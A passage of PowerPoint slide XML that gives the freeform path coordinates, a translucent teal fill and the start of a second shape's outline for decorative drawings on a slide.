                </a:lnTo>
                <a:lnTo>
                  <a:pt x="823531" y="1612900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="765810" y="1587500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="704037" y="1562100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="647090" y="1549400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="594334" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="545147" y="1498600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="498868" y="1485900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="454875" y="1460500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="371246" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330327" y="1409700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="327685" y="1371600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330263" y="1320800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="334937" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338594" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338086" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330327" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394131" y="1168400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="451319" y="1193800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="502805" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="549516" y="1231900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="592378" y="1257300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="632307" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="670242" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="707110" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="780275" y="1320800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="822159" y="1333500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="868159" y="1346200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="916914" y="1371600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1017308" y="1422400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1066228" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1112520" y="1460500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1154811" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1191768" y="1485900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1245527" y="1460500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1294053" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1338656" y="1422400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1380655" y="1397000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1504010" y="1358900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1548612" y="1333500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1652879" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1705546" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1755317" y="1257300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1802384" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1846910" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1889112" y="1206500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1929155" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1967230" y="1168400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2004529" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2048941" y="1130300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2098230" y="1104900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2202611" y="1079500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2253284" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2299982" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2340495" y="1016000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372614" y="990600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382342" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382342" y="794016"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2305113" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2253196" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2202751" y="850900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2154771" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2110206" y="889000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2070061" y="914400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2035302" y="939800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1995373" y="977900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1948611" y="1003300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1897430" y="1016000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1844205" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1791335" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1741208" y="1066800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1696212" y="1079500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1658747" y="1092200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1624723" y="1117600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1582788" y="1130300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1535188" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1484210" y="1168400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1432115" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1381188" y="1206500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1333677" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1291882" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1258062" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1216863" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1172552" y="1231900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1126185" y="1206500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1078839" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1031570" y="1168400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="985431" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="941489" y="1130300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="900823" y="1117600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="864489" y="1104900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="833285" y="1104900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="800290" y="1092200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="765073" y="1079500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="727202" y="1066800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="686269" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="641832" y="1028700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="593483" y="1003300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="540778" y="977900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="483298" y="952500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420624" y="927100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415404" y="876300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415302" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415213" y="850900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415112" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="417614" y="800100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420789" y="762000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="422490" y="711200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420624" y="660400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="463423" y="673100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="502818" y="685800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="540664" y="698500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="578815" y="723900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="619137" y="749300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="663498" y="762000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="713740" y="787400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="771740" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="839343" y="825500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="899134" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="948601" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="990104" y="876300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1026045" y="889000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1090726" y="927100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1124242" y="952500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1161719" y="965200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1205522" y="977900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1258062" y="990600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1297228" y="965200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1377784" y="939800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1420431" y="914400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1465516" y="901700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1513649" y="889000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1565478" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1621637" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1682750" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1750364" y="787400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1810461" y="774700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1864067" y="749300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1912251" y="736600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1956028" y="723900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1996440" y="711200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2034540" y="685800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2071370" y="660400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2110714" y="635000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2155037" y="609600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2203158" y="596900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2253907" y="584200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2306142" y="558800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2410333" y="533400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2459990" y="508000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2460904" y="558800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2460904" y="287540"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2445905" y="279400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2396883" y="266700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2345575" y="241300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2291880" y="228600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2235708" y="203200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2183790" y="190500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2133295" y="165100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2084070" y="152400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2035962" y="127000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1942528" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1896897" y="63500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1851799" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1718195" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1673733" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1637220" y="25400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1594637" y="50800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1547495" y="63500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1343926" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1296898" y="127000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1254480" y="139700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1218184" y="152400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1181176" y="177800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1142682" y="190500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1102321" y="190500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1059764" y="203200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1014628" y="215900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="966571" y="228600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="915250" y="241300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="860298" y="266700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="742276" y="342900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="686943" y="368300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="635139" y="381000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="586600" y="406400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="541083" y="406400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="498373" y="419100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="458203" y="431800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420344" y="444500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384556" y="444500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="347726" y="469900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="316763" y="508000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="291617" y="546100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="272173" y="584200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258381" y="622300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="250151" y="673100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247408" y="723900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="250075" y="762000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258064" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258127" y="825500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258203" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258279" y="850900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="259981" y="876300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="264464" y="914400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="273050" y="939800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="244233" y="977900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="219100" y="1016000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="198056" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181483" y="1104900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="169748" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163283" y="1193800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162445" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="167640" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="166903" y="1346200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="174345" y="1384300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="188556" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208165" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="231800" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258064" y="1562100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252552" y="1600200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252501" y="1612900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252387" y="1638300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="253542" y="1689100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="251968" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="250177" y="1803400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252742" y="1854200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="260540" y="1892300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="274434" y="1943100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="295313" y="1981200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324040" y="2006600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="361492" y="2032000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="408559" y="2044700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="469341" y="2057400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="519252" y="2082800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="560832" y="2095500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="596696" y="2120900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="629386" y="2133600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="661504" y="2159000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="695604" y="2171700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="734288" y="2197100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="780110" y="2209800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="835660" y="2222500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="900087" y="2247900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="957757" y="2260600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1009548" y="2286000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1056322" y="2324100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1098981" y="2349500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1138389" y="2362200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1175448" y="2387600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1245997" y="2387600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1406906" y="2336800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1449133" y="2324100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1493075" y="2298700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1539214" y="2286000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1587995" y="2273300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1639887" y="2247900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1695361" y="2222500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1735035" y="2197100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1754886" y="2184400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1815680" y="2146300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1874583" y="2120900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1931225" y="2095500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1985302" y="2070100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2036457" y="2057400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2084374" y="2044700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2128710" y="2032000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2169134" y="2019300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2205317" y="2006600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2263648" y="1968500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2293150" y="1955800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2328151" y="1930400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2367978" y="1917700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2411996" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2459571" y="1892300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2510040" y="1879600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2562783" y="1854200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2617127" y="1841500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2672435" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2728087" y="1778000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2689999" y="1778000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2651772" y="1752600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2612517" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2571369" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2570022" y="1676400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2570708" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2572474" y="1574800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2574366" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2575433" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2574760" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2573909" y="1422400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2571369" y="1384300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2616911" y="1371600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2684322" y="1346200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2728087" y="1320800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2680347" y="1308100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2585656" y="1257300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2487041" y="1231900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2484526" y="1193800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2485288" y="1155700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2487612" y="1117600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2489797" y="1066800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2489898" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2489987" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2490076" y="1028700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2490178" y="1016000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2489123" y="990600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2487041" y="939800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2533497" y="914400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2576030" y="901700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2693619" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2734056" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701950" y="825500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2666187" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2625191" y="800100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2577465" y="787400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2572410" y="723900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2571292" y="673100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2572753" y="622300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2575445" y="571500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2578023" y="533400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2578773" y="508000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2579141" y="495300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2577465" y="457200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2617851" y="431800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2653563" y="431800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2690368" y="419100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2734056" y="393700"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6251676" y="3549408"/>
            <a:ext cx="3197225" cy="2564765"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3197225" h="2564765">
                <a:moveTo>
                  <a:pt x="391439" y="219443"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="349440" y="187439"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="311251" y="154787"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="277329" y="120624"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248094" y="84035"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="224002" y="44132"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="205511" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181305" y="38862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153746" y="79044"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123304" y="118859"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90474" y="156654"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55727" y="190741"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19583" y="219443"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66560" y="253288"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107175" y="286029"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="141401" y="319316"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="169214" y="354799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190588" y="394119"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="205511" y="438899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226174" y="392722"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252323" y="349580"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="282943" y="310083"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="317004" y="274815"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="353517" y="244411"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391439" y="219443"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="3197225" h="2564765">
                <a:moveTo>
                  <a:pt x="1653768" y="205803"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1650263" y="146164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1634490" y="110032"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1595399" y="91427"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1575765" y="94437"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1557439" y="107797"/>
